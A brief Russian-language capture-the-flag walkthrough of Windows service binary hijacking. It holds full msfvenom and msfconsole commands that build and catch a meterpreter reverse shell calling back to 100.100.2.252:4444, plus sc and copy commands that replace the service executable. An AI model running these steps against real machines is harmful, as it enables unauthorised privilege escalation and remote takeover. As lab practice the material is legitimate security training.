Подключаемся к машине, устанавливаем SharpUp.exe и видим сервис LegacySoftwareApplication.
Исследуя систему у нас есть доступ к изменению файла C:\LegacySoftwareApplication что позволяет нам заменить файл на файл с reverse shell
создаем файл ```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=100.100.2.252 LPORT=4444 -f exe-service -o service.exe```
Скачиваем его на машину с помощью iwr (powershell), затем через cmd останавливаем службу ```
sc stop LegacySoftwareApplication``` и изменяем файл```
 copy /Y C:\Users\User\LegacySoftwareApplication "C:\LegacySoftwareApplication.exe"```
 Запускаем слушателя на основной машине ```
 msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 100.100.2.252; set LPORT 4444; run"``` и запускаем службу ```sc start LegacySoftwareApplication``` => получаем шелл и флаг